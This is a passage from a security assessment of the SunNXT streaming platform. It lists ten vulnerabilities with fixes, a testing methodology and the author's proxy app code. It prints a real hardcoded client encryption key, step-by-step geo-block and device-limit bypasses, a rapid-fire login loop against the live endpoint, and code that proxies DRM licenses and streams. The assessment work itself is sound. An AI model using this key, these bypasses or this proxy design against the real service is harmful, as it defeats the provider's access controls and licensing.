### The Geo-Block Error Response

When a session IS geo-blocked (old session, or login from abroad):

```json
{
  "code": 200,
  "results": [{
    "blocked_reason": "roaming_expired_30",
    "home_country": "IN",
    "notify_type": "error_notify",
    "title": "International Roaming Expired",
    "p1": "International access expired.",
    "p2": "You can continue streaming free content. Paid content accessible when you return to India."
  }]
}
```

Note: HTTP status is 200 even though this is an error. See VULN-09.

### Detection and Recovery

```typescript
function getRoamingError(data): string | null {
  const r0 = data.results?.[0];
  if (r0?.blocked_reason || r0?.notify_type === "error_notify") {
    return r0.title || r0.p1 || "Content blocked";
  }
  return null;
}

// In the media route handler:
const isRoaming = getRoamingError(data) !== null;
if (isRoaming) {
  // Logout + fresh login from current IP
  cookieHeader = await forceRelogin();
  // Retry media fetch with new session
  data = await fetchMedia(contentId, cookieHeader);
  
  if (getRoamingError(data)) {
    // Still blocked after fresh login
    return NextResponse.json({ code: 451, error: "geo_blocked", ... });
  }
}
```

### Why Vercel Mumbai Fixes This

```
Without bom1:   Vercel functions run in US (iad1) → IP = 76.76.21.x → geo-blocked
With bom1:      Vercel functions run in Mumbai → IP = 103.21.x.x → India → unrestricted
```

`vercel.json`:
```json
{ "regions": ["bom1"] }
```

---

## 11. All 10 Vulnerabilities — How They Happen & How to Fix

---

### VULN-01: Static AES Key in Client JavaScript
**Severity: High**

**How it happens:**

Developer wants to "secure" login credentials. They add AES encryption. But AES requires a key, and the key is needed on both client AND server. The developer puts the key in the JavaScript code because it has to be on the client. Now the key is public.

```javascript
// In SunNXT's bundle.min.js (simplified)
var k = "A3s68aORSgHs$71P";
var enc = CryptoJS.AES.encrypt(payload, k, { iv: iv });
```

**Impact:** Anyone can extract the key, decrypt all login requests intercepted on the same network, decrypt all API responses.

**How to find it:**
1. Chrome DevTools → Sources → Ctrl+Shift+F
2. Search: `CryptoJS.AES.encrypt`
3. Key string is right there

**How to fix it:**

Option A (best): Remove application-layer encryption. HTTPS is sufficient.

Option B: Asymmetric encryption — browser encrypts with server's public key, only server can decrypt with private key:
```javascript
// Client
const publicKey = await fetchServerPublicKey();
const encrypted = await window.crypto.subtle.encrypt(
  { name: "RSA-OAEP" },
  publicKey,
  new TextEncoder().encode(JSON.stringify(credentials))
);
```

---

### VULN-02: Static All-Zero IV in AES-CBC
**Severity: Medium**

**How it happens:**

Developer implements AES-CBC. CBC requires an IV. They use zero bytes "for simplicity" or don't realize a static IV is a problem.

```javascript
const iv = CryptoJS.enc.Hex.parse("00000000000000000000000000000000"); // always zero
```

**Impact:** Deterministic encryption — same password = same ciphertext. Enables pattern analysis attacks on captured login requests.

**How to detect it:**

Log in twice with the same credentials. Compare the first 32 characters of the `payload` parameter in both requests. If identical → static IV confirmed.

**How to fix it:**

```javascript
// Generate random IV per request
const iv = CryptoJS.lib.WordArray.random(16);
const encrypted = CryptoJS.AES.encrypt(payload, key, { iv: iv });

// Prepend IV to ciphertext: "ivhex:ciphertext"
const result = iv.toString(CryptoJS.enc.Hex) + ":" + encrypted.toString();

// Server: split on ":", decode IV from first part, use to decrypt second part
```

---

### VULN-03: Device Registration Limit Bypass
**Severity: Medium**

**How it happens:**

The device limit is enforced at the UI level (return a 423 code, show a webview). But the underlying API that removes devices has no proper access control.

```
Login response (423):
  {
    "ui": {
      "buttons": [{
        "action": "webView",
        "buttonAction": "https://www.sunnxt.com/managedevices?token=abc123"
      }]
    }
  }

GET /managedevices?token=abc123
  → Returns HTML with: <a href="/removeDevice?token=abc123&deviceId=456789">Remove</a>
  (No session check. Any request with the token works.)

GET /removeDevice?token=abc123&deviceId=456789
  → Device removed. No CSRF. No confirmation.
```

**Impact:** Device limit provides zero security. Can be bypassed in 3 HTTP requests.

**How to fix it:**

```python
# Server-side fix
def remove_device(request):
    token = request.GET["token"]
    device_id = request.GET["deviceId"]
    
    # CURRENT (wrong): just check token exists
    # FIXED: verify token belongs to current session
    session_user = get_user_from_session(request.COOKIES["sessionid"])
    token_owner = get_token_owner(token)
    
    if session_user != token_owner:
        return HttpResponse(status=403)
    
    # Also: require POST method + CSRF token
    # Also: send email notification to account owner
    do_remove_device(device_id)
```

---

### VULN-04: Long-Lived Sessions Without Expiry
**Severity: Medium**

**How it happens:**

Developer creates sessions on login. Sessions are invalidated on logout. But there's no automatic expiry. Users rarely log out explicitly — they just close the browser tab. If the session cookie is ever stolen (XSS, network, browser compromise), it works indefinitely.

**How to detect it:**
1. Login → copy `sessionid` cookie value to a text file
2. Wait 48+ hours
3. Use saved cookie in a curl request
4. If it still returns valid data → no TTL

```bash
curl "https://www.sunnxt.com/next/api/media/82850?..." \
  -H "Cookie: sessionid=<your_saved_cookie>"
```

**How to fix it:**

```python
# Server-side middleware on every request:
def session_middleware(request, next):
    session = get_session(request.cookies["sessionid"])
    
    if not session:
        return unauthorized()
    
    # Idle timeout
    if now() - session.last_activity > timedelta(hours=24):
        session.delete()
        return unauthorized("Session expired due to inactivity")
    
    # Absolute timeout
    if now() - session.created_at > timedelta(days=30):
        session.delete()
        return unauthorized("Session expired, please login again")
    
    session.last_activity = now()
    session.save()
    return next(request)
```

---

### VULN-05: ManageDevices Missing Access Control (IDOR)
**Severity: Medium**

**How it happens:**

Classic IDOR (Insecure Direct Object Reference). The "object reference" is the `token` URL parameter. Server doesn't verify the token belongs to the currently authenticated user.

```
Attack scenario:
1. Victim logs in → hits device limit → 423 response with token=VICTIM_TOKEN
2. Attacker intercepts (or victim shares) the 423 response
3. Attacker uses VICTIM_TOKEN to:
   GET /managedevices?token=VICTIM_TOKEN → sees victim's devices
   GET /removeDevice?token=VICTIM_TOKEN&deviceId=XXX → removes victim's devices
4. Victim can no longer log in (their devices removed, limit still appears hit)
```

**How to fix it:**

```python
# Option 1: Session-bound token
def manage_devices(request):
    token = request.GET["token"]
    
    # Verify token ownership
    if not is_token_owned_by(token, request.session["user_id"]):
        return forbidden()
    
    return render_device_list(token)

# Option 2: Short-lived token with expiry
def generate_device_mgmt_token(user_id):
    return jwt.encode({
        "user_id": user_id,
        "exp": datetime.now() + timedelta(minutes=10),
        "purpose": "device_management"
    }, SECRET_KEY, algorithm="HS256")
```

---

### VULN-06: CDN Tokens Without IP Binding
**Severity: Low**

**How it happens:**

Akamai CDN supports IP-bound tokens (`ip=` parameter). SunNXT doesn't use it, so anyone with a valid stream URL can access CDN segments until the token expires.

```
Stream URL structure:
https://movies2-suntvvod.akamaized.net/movies/82850_hd.mpd
  ?hdntl=exp=1779436600~acl=/movies/*~hmac=abc123

With IP binding (not used):
  ?hdntl=exp=1779436600~acl=/movies/*~ip=203.0.113.45~hmac=xyz789
  (Akamai rejects requests from any IP other than 203.0.113.45)
```

**How to detect it:** Get a stream URL from the media API. Try accessing it from a different IP (VPN, proxy). If it works → no IP binding.

**How to fix it:**

When generating Akamai tokens, include the end-user's IP:
```python
def generate_cdn_token(content_path, user_ip):
    params = {
        "exp": int(time.time()) + 7200,  # 2 hours
        "acl": f"/movies/{content_path}/*",
        "ip": user_ip,  # bind to user's IP
    }
    signature = hmac_sha256(AKAMAI_SECRET, params)
    return f"exp={params['exp']}~acl={params['acl']}~ip={params['ip']}~hmac={signature}"
```

---

### VULN-07: Geo-Block Bypass via Server-Side Proxy
**Severity: Medium**

**How it happens:**

Geo-check is only at login time. By routing the login through an Indian IP (Vercel Mumbai), the session is flagged as Indian. All subsequent requests use that session, even from non-Indian IPs.

```
Attack flow:
1. Deploy Next.js app on Vercel Mumbai region
2. Login request originates from 103.21.x.x (Mumbai)
3. SunNXT creates session: geo_flag = "IN"
4. User in US uses this session to access paid content → works

Even simpler: use any Indian VPN only for the login request, then disconnect.
```

**How to fix it:**

Validate the client IP on EVERY media request, not just at login:
```python
def get_media(request, content_id):
    # Current wrong approach:
    # session = get_session(request)
    # if session.geo_flag == "IN": ok
    
    # Correct approach:
    client_ip = get_real_client_ip(request)  # must handle proxy headers carefully
    country = geoip.lookup(client_ip)
    
    if country != "IN" and is_premium_content(content_id):
        return json_response({
            "blocked_reason": "geo_restriction",
            "title": "Not Available In Your Region"
        }, status=451)  # Also fix status code (VULN-09)
```

---

### VULN-08: DRM JWT IP Bound to Server Proxy IP
**Severity: Low**

**How it happens:**

The JWT's `ip_address` field is set to the Next.js server's IP (the proxy), not the end-user's browser IP. Nagravision validates the license request comes from the JWT's `ip_address` — which it does, because all requests go through the proxy.

```
JWT: { "ip_address": "157.51.128.36" }  ← This is the Vercel server IP

Browser at 72.14.x.x (US) → /api/license proxy → 157.51.128.36 → Nagravision
                                                    (matches JWT ip) → license issued

Another browser at 89.x.x.x (Europe) → same proxy → 157.51.128.36 → license issued
(Also matches JWT ip! IP binding is useless.)
```

**How to fix it:**

Option A (best): Don't proxy license requests. Have the browser contact Nagravision directly (add CORS headers to Nagravision endpoint, pass session via Authorization header instead of cookie).

Option B: Pass the real end-user IP to Nagravision via a trusted header, and have the JWT contain the user's IP:
```python
def get_license_url(content_id, user_ip):
    jwt_payload = {
        "content_id": content_id,
        "ip_address": user_ip,  # REAL user IP, not proxy IP
        "maxUses": 1,
        "expiryTime": int(time.time()) + 7200
    }
    token = sign_jwt(jwt_payload, NAGRAVISION_SECRET)
    return f"https://api.sunnxt.com/licenseproxy/v3/...?content_id={content_id}&token={token}"
```

---

### VULN-09: HTTP 200 for Error States
**Severity: Informational**

**How it happens:**

Developer returns HTTP 200 for all responses, encoding the success/failure state in the JSON body. Likely done for simplicity ("we always return JSON, just check the `code` field").

**Why it matters:**

```
Monitoring systems:  WAFs, SIEM tools count 4xx/5xx to detect attacks.
                     If geo-blocks return 200, they're invisible to monitoring.

Rate limiters:       Some WAFs rate-limit on 4xx counts.
                     If brute force returns 200, these rules don't trigger.

Caching:             CDNs may cache 200 responses but not 4xx.
                     A cached geo-block 200 could serve the wrong content to other users.

Client bugs:         A client that trusts "200 = success" will try to parse
                     a block response as valid content → confusing errors.
```

**How to fix it:**

```python
# Map error states to correct HTTP status codes
if blocked_reason == "roaming_expired_30":
    return JsonResponse(error_body, status=451)  # 451 = Unavailable For Legal Reasons

if not authenticated:
    return JsonResponse(error_body, status=401)  # 401 = Unauthorized

if subscription_required:
    return JsonResponse(error_body, status=402)  # 402 = Payment Required

if content_not_found:
    return JsonResponse(error_body, status=404)  # 404 = Not Found
```

---

### VULN-10: No Rate Limiting on Login API
**Severity: Medium**

**How it happens:**

Developer builds login endpoint. Doesn't add rate limiting because "we'll add it later" or because the framework doesn't include it by default. It never gets added.

**What this enables:**

1. **Brute force:** Try millions of password combinations against one account
2. **Credential stuffing:** Use breached username/password lists from other sites
3. **Password spraying:** Try one common password ("123456") against millions of accounts

**Combined with VULN-01:** Since the encryption key is known, attackers can generate valid encrypted login payloads programmatically at scale.

**How to detect it:**
```bash
# Send 20 login requests rapidly
for i in {1..20}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST "https://www.sunnxt.com/next/api/login" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "x-myplex-platform: browser" -H "x-ucv: 5" \
    -d "payload=invalid_test&version=1"
done
# All return the same error code (no lockout) → vulnerable
```

**How to fix it:**

```python
import redis

def login(request):
    ip = get_client_ip(request)
    
    # 1. IP-based rate limit: 10 attempts per 15 min
    ip_key = f"login_rate:{ip}"
    attempts = redis.incr(ip_key)
    if attempts == 1:
        redis.expire(ip_key, 900)  # 15 minutes
    if attempts > 10:
        return JsonResponse({"error": "Too many requests"}, status=429)
    
    # 2. Validate credentials
    data = decrypt_payload(request.body)
    user = authenticate(data["userid"], data["password"])
    
    if not user:
        # 3. Per-account lockout after 5 failures
        fail_key = f"login_fails:{data['userid']}"
        fails = redis.incr(fail_key)
        if fails == 1:
            redis.expire(fail_key, 900)
        if fails >= 5:
            redis.setex(f"account_locked:{data['userid']}", 900, 1)
            # Send account lockout email to user
        return JsonResponse({"code": 401, "error": "Invalid credentials"})
    
    # 4. Clear failure counter on success
    redis.delete(f"login_fails:{data['userid']}")
    return create_session_response(user)
```

---

## 12. The Complete Request Flow — Step by Step

Here is the complete flow for a user clicking "Play" on a movie:

```
USER CLICKS PLAY on content ID 82850
│
▼
STEP 1: Player page mounts
  app/player/[contentId]/page.tsx
  → loadAndPlay("82850") called
│
▼
STEP 2: Media API called
  Browser: GET /api/media/82850
  │
  ▼
  Next.js: app/api/media/[contentId]/route.ts
  │
  ├── Check browser cookie for sessionid
  │   If no session → try SUNNXT_USERID / SUNNXT_PASSWORD credentials
  │   If still no session → return 401 { error: "login_required" }
  │
  ├── Call getSunnxtCookies() → returns cached or fresh session
  │
  ├── GET https://www.sunnxt.com/next/api/media/82850?bw=5000000&nid=4
  │   Headers: x-myplex-platform: browser, cookie: sessionid=...
  │
  ├── Response may be:
  │   - Encrypted: { response: "base64ciphertext" } → decrypt with AES key
  │   - Plain JSON: { code: 200, results: [...] }
  │
  ├── Check for errors:
  │   - Roaming error → forceRelogin() → retry
  │   - videos.status (no values) → return 404 video_unavailable
  │   - code 401/403 → invalidateSession() → retry with fresh login
  │
  ├── normalizeVideos():
  │   - Fix relative hlsaes URLs → prepend https://suntvvod1.sunnxt.com/
  │   - Propagate licenseUrl from dash-cenc → format=dash entries
  │
  └── Return normalized JSON to browser
│
▼
STEP 3: Player selects format
  Browser: loadAndPlay receives data
  │
  ├── Format priority:
  │   1. widevineDash: format="dash" + licenseUrl (Akamai, Chrome Widevine)
  │   2. cencDash: format="dash-cenc" (suntvvod1, PlayReady/Edge)
  │   3. hlsVideo: HLS (FairPlay/AES-128)
  │   4. videos[0]: first available
  │
  └── Call startPlayback(video, contentId)
│
▼
STEP 4: Shaka Player initialized
  startPlayback():
  │
  ├── Import shaka-player dynamically
  ├── shaka.polyfill.installAll()
  ├── new shaka.Player() → player.attach(videoElement)
  │
  ├── Register error listener:
  │   - If DRM error (category 6):
  │     failedDrmLinksRef.add(currentVideo.link)
  │     loadAndPlay(id) → retry with next format
  │
  ├── Register request filter:
  │   Intercept all requests → if SunNXT CDN URL →
  │   rewrite to /api/stream-proxy?url=<encoded>
  │
  ├── Configure DRM (if licenseUrl present):
  │   com.widevine.alpha → /api/license?url=<nagravision_url>
  │   com.microsoft.playready → /api/license?url=<nagravision_url>
  │
  └── player.load(proxyManifestUrl)
│
▼
STEP 5: Manifest fetched via proxy
  Shaka: GET /api/stream-proxy?url=https://movies2-suntvvod.akamaized.net/.../82850_hd.mpd
  │
  ▼
  stream-proxy/route.ts:
  │
  ├── Validate domain in allowlist
  ├── Fetch from Akamai with auth cookie
  ├── MPD detected (content-type or .mpd extension):
  │   - Inject <BaseURL>https://movies2-suntvvod.akamaized.net/.../</BaseURL>
  │   - Return rewritten XML with Access-Control-Allow-Origin: *
  └── Non-MPD (segments): stream body directly
│
▼
STEP 6: DRM license requested
  Shaka reads <ContentProtection> → Widevine PSSH
  Browser CDM generates license challenge (binary)
  │
  ▼
  Shaka: POST /api/license?url=https://api.sunnxt.com/licenseproxy/v3/...
  Body: <binary Widevine challenge>
  │
  ▼
  license/route.ts:
  │
  ├── Get session cookie (browser session preferred, server session fallback)
  ├── POST to Nagravision with session cookie + binary challenge
  ├── Nagravision validates: JWT, subscription, device
  └── Return binary license to Shaka
│
▼
STEP 7: Video plays
  Shaka: session.update(license)
  CDM: extracts content key
  Segments downloaded → decrypted → decoded → rendered
  │
  ▼
  loadingDone = true
  videoElement.play()
  startHeartbeat(contentId) → POST /api/heartbeat every 30s
│
▼
PLAYING ✓
```

---

## 13. Code Reference — Every Key Function Explained

### `encryptPayload(obj)` — lib/sunnxt-session.ts

```typescript
function encryptPayload(obj: Record<string, string>): string {
  const keyWA = CryptoJS.enc.Utf8.parse(MEDIA_KEY);   // "A3s68aORSgHs$71P" as bytes
  const iv = CryptoJS.enc.Hex.parse("000000...0");     // 16 zero bytes
  return CryptoJS.AES.encrypt(JSON.stringify(obj), keyWA, {
    iv,
    mode: CryptoJS.mode.CBC,
    padding: CryptoJS.pad.Pkcs7,  // pad to 16-byte block boundary
  }).toString(); // Base64 output
}
```

**Why:** SunNXT API rejects plaintext credentials. This matches their client's encryption exactly.
**Security issue:** Key is hardcoded (VULN-01), IV is static (VULN-02).

---

### `decryptResponse(response)` — lib/sunnxt-session.ts

```typescript
export function decryptResponse(response: string): unknown {
  const keyWA = CryptoJS.enc.Utf8.parse(MEDIA_KEY);
  const iv = CryptoJS.enc.Hex.parse("000000...0");
  const bytes = CryptoJS.AES.decrypt(response, keyWA, { iv, mode: CBC, padding: Pkcs7 });
  const hex = bytes.toString(CryptoJS.enc.Hex);        // WordArray → hex string
  return JSON.parse(Buffer.from(hex, "hex").toString("utf8")); // hex → Buffer → UTF-8 → JSON
}
```

**Why the double conversion:** CryptoJS uses 32-bit integer WordArrays internally. Direct `.toString(Utf8)` can fail on non-ASCII bytes. Converting to hex first ensures every byte is preserved.

---

### `getSunnxtCookies()` — lib/sunnxt-session.ts

```typescript
export async function getSunnxtCookies(): Promise<string> {
  if (!process.env.SUNNXT_USERID) throw new Error("No credentials");
  if (cachedCookies) return cachedCookies;  // return cached immediately
  
  // loginPromise deduplication: 10 concurrent requests → 1 login attempt
  if (!loginPromise) {
    loginPromise = doLogin().finally(() => { loginPromise = null; });
  }
  return loginPromise;
}
```

**Why the deduplication:** Without it, 10 simultaneous first requests would each trigger a login, creating 10 sessions and potentially hitting device limits.

---

### `normalizeVideos(data)` — app/api/media/[contentId]/route.ts

```typescript
function normalizeVideos(data: Record<string, unknown>): void {
  const videos = data.results?.[0]?.videos;
  if (!videos?.values) return;

  // Fix 1: Resolve relative URLs (hlsaes format has relative paths)
  videos.values = videos.values.map((v) => {
    if (v.link && !v.link.startsWith("http")) {
      return { ...v, link: `https://suntvvod1.sunnxt.com/${v.link}` };
    }
    return v;
  });

  // Fix 2: Propagate licenseUrl from dash-cenc → format=dash
  // IMPORTANT: only use dash-cenc licenseUrl, NOT hls-fp-aapl (FairPlay URL)
  const dashCencLicenseUrl = videos.values.find(v => v.format === "dash-cenc")?.licenseUrl;
  if (dashCencLicenseUrl) {
    videos.values = videos.values.map((v) => {
      if (!v.licenseUrl && v.format === "dash") {
        return { ...v, licenseUrl: dashCencLicenseUrl };
      }
      return v;
    });
  }
}
```

**Why this bug existed:** `anyLicenseUrl` was picking the FIRST entry with a licenseUrl — which is `hls-fp-aapl` (FairPlay). Sending a Widevine challenge to a FairPlay server = Shaka error 6008. Fixed by specifically looking for `dash-cenc` licenseUrl.

---

### `rewriteMpd(xml, manifestUrl)` — app/api/stream-proxy/route.ts

```typescript
function rewriteMpd(xml: string, manifestUrl: string): string {
  const baseDir = manifestUrl.substring(0, manifestUrl.lastIndexOf("/") + 1);
  const baseUrlTag = `<BaseURL>${baseDir}</BaseURL>`;
  
  if (/<MPD[^>]*>/.test(xml)) {
    return xml.replace(/(<MPD[^>]*>)/, `$1\n  ${baseUrlTag}`);
  }
  return `${baseUrlTag}\n${xml}`;
}
```

**Why:** DASH segment paths are relative to the manifest URL. After proxying through `/api/stream-proxy`, the base URL changes to our server. Injecting `<BaseURL>` tells Shaka to resolve segment paths relative to the original CDN URL, not our server.

---

### `startPlayback(video, id)` — app/player/[contentId]/page.tsx

```typescript
async function startPlayback(video: VideoEntry, id: string) {
  currentVideoRef.current = video;  // track for DRM error recovery

  const shaka = await import("shaka-player");
  shaka.polyfill.installAll();

  if (playerRef.current) await playerRef.current.destroy();
  const player = new shaka.Player();
  await player.attach(videoRef.current);
  playerRef.current = player;

  // DRM error recovery: if license fails AFTER load(), retry next format
  let loadingDone = false;
  player.addEventListener("error", (event) => {
    if (!loadingDone) return;
    const isDrm = event.detail?.category === 6;
    if (isDrm) {
      failedDrmLinksRef.current.add(currentVideoRef.current.link);
      loadAndPlay(id);  // retry — failedDrmLinks filters this format out
    }
  });

  // Route all CDN requests through proxy
  player.getNetworkingEngine().registerRequestFilter((_type, request) => {
    const url = request.uris[0];
    if (url.includes("/api/stream-proxy")) return;
    if (isSunnxtCdnUrl(url)) {
      request.uris[0] = `/api/stream-proxy?url=${encodeURIComponent(url)}`;
    }
  });

  // Configure DRM
  if (video.licenseUrl) {
    const proxyUrl = `/api/license?url=${encodeURIComponent(video.licenseUrl)}`;
    const isPlayReadyOnly = video.format === "dash-cenc";
    player.configure({ drm: { servers: {
      ...(isPlayReadyOnly ? {} : { "com.widevine.alpha": proxyUrl }),
      "com.microsoft.playready": proxyUrl,
    }}});
  }

  // Quality fallback loop: try _hd.mpd → _est_hd.mpd etc.
  const fallbacks = buildQualityFallbacks(video.link);
  for (const url of fallbacks) {
    try {
      const loadUrl = isSunnxtCdnUrl(url) ? `/api/stream-proxy?url=${encodeURIComponent(url)}` : url;
      await player.load(loadUrl);
      loadingDone = true;
      videoRef.current.play();
      startHeartbeat(id);
      return;
    } catch (e) {
      if ((e as any).data?.[1] !== 404) throw e;  // only continue on 404
    }
  }
}
```

---

## 14. Security Testing Methodology

### How to Test Any OTT Platform

The approach used in this project, applicable to any OTT security assessment:

### Phase 1: Reconnaissance (Passive)

```
1. Open the platform in Chrome with DevTools (F12) open
2. Network tab: record all requests during:
   - Page load
   - Login flow
   - Content browsing
   - Video play
3. Sources tab: search JS files for:
   - "secret", "key", "token", "password", "encrypt", "CryptoJS"
   - Base64-encoded strings (long strings of [A-Za-z0-9+/=])
   - UUID patterns (8-4-4-4-12 hex)
4. Application tab: check:
   - Cookies (names, values, HttpOnly flag, expiry)
   - LocalStorage (any sensitive data stored here?)
   - SessionStorage
```

### Phase 2: Authentication Testing

```
Test 1: Rate limiting on login
  → Submit 20+ failed logins rapidly
  → Observe: lockout? CAPTCHA? 429 response? Increasing delay?
  → If none of these → VULN-10

Test 2: Session expiry
  → Login → copy sessionid cookie
  → Wait 24h → use saved cookie
  → If still valid → VULN-04

Test 3: Session fixation
  → Note sessionid BEFORE login
  → Login → check if sessionid CHANGED
  → If unchanged → session fixation vulnerability

Test 4: Credential encryption
  → Intercept login request
  → Search JS for the encryption key
  → If key found in client code → VULN-01
```

### Phase 3: Authorization Testing

```
Test 1: IDOR on object IDs
  → Find any URL with a numeric ID: /api/user/12345/data
  → Change 12345 to another user's ID
  → If you get their data → IDOR

Test 2: Horizontal privilege escalation
  → As a free user, try calling: GET /api/media/82850
    (premium content) with your free session
  → If you get stream URLs → missing subscription check

Test 3: Vertical privilege escalation
  → As a regular user, try admin endpoints:
    GET /api/admin/users, POST /api/admin/config
  → Check if role is validated server-side

Test 4: Device limit bypass
  → Hit device limit → capture the 423 response
  → Try accessing ManageDevices URL from a different browser
  → If it works without re-authenticating → VULN-05
```

### Phase 4: Cryptography Testing

```
Test 1: Static IV detection
  → Log in twice with same credentials
  → Compare first 32 chars of payload parameter
  → If identical → static IV (VULN-02)

Test 2: Hardcoded keys
  → DevTools → Sources → Ctrl+Shift+F
  → Search: "encrypt", "AES", "secret"
  → Any key found in client code → VULN-01

Test 3: Weak TLS
  → Test with: curl --tlsv1.0 https://www.sunnxt.com
  → If TLS 1.0/1.1 accepted → weak TLS configuration

Test 4: Certificate validation
  → Set up mitmproxy with self-signed cert
  → Point browser through it
  → If connections succeed → certificate pinning not implemented
```

### Phase 5: API Security Testing

```
Test 1: Parameter tampering
  → API: GET /api/media/82850?bw=5000000
  → Try: bw=-1, bw=999999999, bw=abc, bw=
  → Check for unexpected behavior or error leakage

Test 2: HTTP method testing
  → Normal: GET /api/media/82850
  → Try: DELETE /api/media/82850, PUT /api/media/82850
  → Should return 405 Method Not Allowed

Test 3: Error message leakage
  → Cause errors intentionally (bad content ID, malformed payload)
  → Do errors reveal stack traces, server paths, DB schemas?

Test 4: Response code testing
  → Test geo-blocked content, invalid session, missing subscription
  → Verify correct HTTP status codes returned
  → 401, 402, 403, 404, 451 should be used correctly (VULN-09)
```

---

## 15. OWASP Top 10 Mapping

The OWASP (Open Web Application Security Project) Top 10 is the standard reference for web security risks. Every SunNXT finding maps to one:

| OWASP 2021 | SunNXT Vulnerability | What Went Wrong |
|---|---|---|
| **A01 Broken Access Control** | VULN-03 (device bypass), VULN-05 (ManageDevices IDOR), VULN-07 (geo bypass) | Server doesn't verify authorization on every request |
| **A02 Cryptographic Failures** | VULN-01 (static key), VULN-02 (static IV) | Encryption key publicly accessible; IV not randomized |
| **A04 Insecure Design** | VULN-06 (CDN tokens), VULN-08 (JWT IP binding) | Architectural decisions that security patches can't fix |
| **A05 Security Misconfiguration** | VULN-09 (HTTP 200 for errors) | Wrong HTTP status codes undermine monitoring |
| **A07 Identification & Auth Failures** | VULN-04 (no session TTL), VULN-10 (no rate limit) | Sessions live forever; brute force unrestricted |

### A01 — Broken Access Control (Ranked #1 Most Common)

Access control = "what is this user allowed to do?"

The three access control findings share a root cause: **authorization is checked at the UI layer, not the API layer**.

```
UI check (what SunNXT does):
  Show "device limit" modal → user can't click past it in the UI
  
API check (what should happen):
  removeDevice endpoint verifies: is the caller the device owner?
```

Attackers don't use the UI. They call APIs directly.

### A02 — Cryptographic Failures

The root cause: **symmetric encryption (requires key on both sides) was chosen for a scenario that needed asymmetric encryption (client can encrypt, only server can decrypt)**.

No implementation fix can solve this. The design must change.

### A07 — Identification and Authentication Failures

Two independent failures:
- **Sessions**: correct authentication, incorrect lifecycle management (no TTL)
- **Rate limiting**: the authentication endpoint has no brute-force protection

Both are simple to fix with standard middleware.

---

## 16. Glossary

| Term | Definition |
|---|---|
| **AES** | Advanced Encryption Standard — symmetric block cipher (AES-128 = 128-bit key) |
| **AES-CBC** | AES in Cipher Block Chaining mode — each block XORed with previous ciphertext |
| **AES-CTR** | AES in Counter mode — each block XORed with encrypted counter (used in CENC) |
| **CDM** | Content Decryption Module — browser's DRM engine (e.g., Widevine CDM) |
| **CDN** | Content Delivery Network — edge servers that cache/serve video segments near users |
| **CENC** | Common Encryption — ISO standard allowing one encrypted stream for multiple DRM systems |
| **CORS** | Cross-Origin Resource Sharing — HTTP headers that allow/deny cross-origin browser requests |
| **CSRF** | Cross-Site Request Forgery — attack that tricks a browser into making unintended requests |
| **DASH** | Dynamic Adaptive Streaming over HTTP — MPEG streaming standard using .mpd manifests |
| **DRM** | Digital Rights Management — technology that controls how digital content is used |
| **EME** | Encrypted Media Extensions — W3C browser API for DRM integration |
| **FairPlay** | Apple's DRM system (Safari, iOS, tvOS) |
| **HDCP** | High-bandwidth Digital Content Protection — protects content on display connections |
| **HLS** | HTTP Live Streaming — Apple's streaming format using .m3u8 manifests |
| **HMAC** | Hash-based Message Authentication Code — proves data integrity using a shared secret |
| **IDOR** | Insecure Direct Object Reference — accessing objects by ID without authorization check |
| **IV** | Initialization Vector — random value XORed with first block in CBC mode; must be unique |
| **JWT** | JSON Web Token — signed JSON payload used for stateless authentication/authorization |
| **KID** | Key Identifier — UUID that identifies which content key is being requested |
| **MPD** | Media Presentation Description — XML manifest file for MPEG-DASH streams |
| **OWASP** | Open Web Application Security Project — organization defining web security standards |
| **PKCS7** | Padding scheme that fills the last AES block to 16 bytes |
| **PlayReady** | Microsoft's DRM system (Edge, Windows, Xbox) |
| **PSSH** | Protection System Specific Header — DRM initialization data embedded in manifests/segments |
| **Session** | Server-side record of an authenticated user, referenced by a cookie |
| **SOP** | Same-Origin Policy — browser rule preventing cross-origin JS requests |
| **TEE** | Trusted Execution Environment — hardware-isolated area for secret processing |
| **Widevine** | Google's DRM system (Chrome, Firefox, Android) |
| **wvm** | Widevine Media (.wvm) — legacy Widevine Classic format, not supported in modern browsers |

---

*This document was authored by Nitheesh D R as part of the SunNXT security assessment, May 2026.*
*For the formal vulnerability report with CVSS scores, see [SECURITY_REPORT.md](SECURITY_REPORT.md).*
